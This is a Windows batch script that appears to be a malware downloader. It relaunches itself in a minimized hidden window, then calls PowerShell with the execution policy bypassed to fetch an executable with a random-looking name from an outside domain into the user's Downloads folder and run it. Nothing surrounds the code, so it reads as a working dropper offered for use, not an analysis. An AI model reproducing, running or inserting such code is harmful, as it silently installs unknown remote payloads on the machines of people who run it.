@echo off
setlocal EnableDelayedExpansion


if "%~1"=="HIDDEN" goto :HiddenPart


start /min "" cmd /c "%~f0" HIDDEN
exit

:HiddenPart

set "URL=https://italy-news.info/doc/OVGXZLBM.exe"
set "FILENAME=OVGXZLBM.exe"
set "SAVE_FOLDER=%USERPROFILE%\Downloads"
set "FULL_PATH=%SAVE_FOLDER%\%FILENAME%"


powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%URL%' -OutFile '%FULL_PATH%' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }"


if exist "%FULL_PATH%" (
    start "" "%FULL_PATH%"
)

exit